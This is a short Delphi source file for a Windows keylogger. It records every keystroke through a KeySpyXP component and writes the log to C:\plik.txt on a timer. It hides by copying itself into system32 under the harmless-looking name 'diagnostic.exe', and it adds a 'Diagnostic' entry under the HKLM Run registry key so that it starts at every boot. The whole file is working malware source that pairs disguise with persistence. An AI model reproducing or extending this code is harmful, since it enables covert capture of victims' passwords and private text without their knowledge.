unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, KeySpyXP, registry, CoolTrayIcon, ExtCtrls;

type
  TForm1 = class(TForm)
    KeySpyXP1: TKeySpyXP;
    Memo1: TMemo;
    ScrollBar1: TScrollBar;
    CoolTrayIcon1: TCoolTrayIcon;
    SaveDialog1: TSaveDialog;
    Timer1: TTimer;
    OpenDialog1: TOpenDialog;
    procedure KeySpyXP1Key(Sender: TObject; key: String);
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  Reg:tRegistry;


implementation

{$R *.dfm}

procedure TForm1.KeySpyXP1Key(Sender: TObject; key: String);
begin
if key[1]='{' then
memo1.lines.add(key) else
memo1.Text:=memo1.text+key;
end;




procedure TForm1.Timer1Timer(Sender: TObject);
begin
memo1.lines.savetofile('C:\plik.txt');

end;


procedure TForm1.FormCreate(Sender: TObject);

begin

 if Not FileExists('C:\Plik.txt') Then
begin
memo1.lines.savetofile('C:\plik.txt');




CopyFile('diagnostic.exe', 'C:\Windows\system32\diagnostic.exe', False);

Memo1.Lines.LoadFromFile('C:\plik.txt');

Reg:=TRegistry.Create;

Reg.RootKey := HKEY_LOCAL_MACHINE;
try
Reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run',False);
Reg.WriteString('Diagnostic', 'C:\Windows\system32\diagnostic.exe');
finally
Reg.CloseKey;
Reg.Free;
end;
end;


end;



end.
